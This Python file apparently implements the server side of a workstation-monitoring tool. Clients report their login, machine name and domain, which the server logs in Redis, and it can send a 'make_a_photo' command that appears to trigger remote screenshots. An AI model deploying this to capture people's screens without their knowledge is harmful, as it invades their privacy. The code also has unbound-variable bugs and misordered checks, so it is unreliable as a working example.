import socket
import os
from _thread import *
import redis
from dotenv import load_dotenv
import json
from datetime import datetime, date
import time


load_dotenv()

ServerSocket = socket.socket()
host = 'localhost'
port = 3000

redis_db = redis.Redis(host='localhost', port=6379, db=4)
redis_screenshot_db = redis.Redis(host='localhost', port=6379, db=5)

ThreadCount = 0

try:
    ServerSocket.bind((host, port))

except socket.error as e:
    print(str(e))

print('Waitiing for a Conection...')

ServerSocket.listen(5)


def threaded_client(connection, address):
    connection.send(str.encode('Sucses conection to server...'))

    while True:
        data = connection.recv(2048)
        data = data.decode('utf-8')
        if ('_' in data):
            
            reply = data
            print(f"сообщение от {address}")
            print(data)

            
            data = data.split("_")

            redis_set = {
                "name": data[1],
                "domain": data[2],
                "time": datetime.now().strftime("%H:%M:%S"),
                "date": date.today().strftime("%d/%m/%Y"),
                "login": data[0]
            }

            print(f"\n\n{redis_set}")

            # if data == "photo_is_made":
            #     redis_screenshot_db.delete(f"{address}")
            # else:

            # data_map = json.dumps(redis_set)
            key_db = f"{address}"
            redis_db.hset(key_db, mapping=redis_set)
        
        else:
            print(f"сообщение от {address}")
            print(data)

        if not data:
            break
        if redis_screenshot_db.get(key_db):
            connection.sendall(str.encode("make_a_photo"))
        else:
            connection.sendall(str.encode(reply))

    connection.close()


while True:
    Client, address = ServerSocket.accept()
    print('Connected to:' + address[0] + ':' + str(address[1]))
    inf_socket = f"{address[0]}:{address[1]}"
    start_new_thread(threaded_client, (Client, inf_socket ))
    ThreadCount += 1

    print('Thread Number: ' + str(ThreadCount))

    # ServerSocket.close()